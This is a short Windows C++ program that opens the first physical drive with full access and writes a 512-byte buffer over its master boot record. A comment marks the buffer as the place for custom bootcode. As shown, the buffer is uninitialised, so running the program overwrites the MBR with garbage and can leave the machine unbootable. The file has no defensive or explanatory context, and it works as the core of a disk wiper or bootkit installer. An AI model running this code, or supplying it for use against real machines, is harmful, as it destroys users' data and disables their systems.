#include "stdafx.h"
#include <Windows.h>
#include <iostream>

int main()
{
	HANDLE mbrhandle = CreateFile(
		TEXT("\\\\.\\PHYSICALDRIVE0"), 
		GENERIC_ALL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0, 
		OPEN_EXISTING,
		0, 
		0
	);
	if (mbrhandle == INVALID_HANDLE_VALUE) {
		CloseHandle(mbrhandle);
		return EXIT_FAILURE;
	}

	DWORD mbrsize = 512;
	char newmbr[512]; //write bootcode here

	if (WriteFile(mbrhandle, &newmbr, mbrsize, NULL, NULL)) {
		std::cout << "Success" << std::endl;
	}
	else {
		std::cout << "Fail" << std::endl;
	}

	CloseHandle(mbrhandle);
    return 0;
}

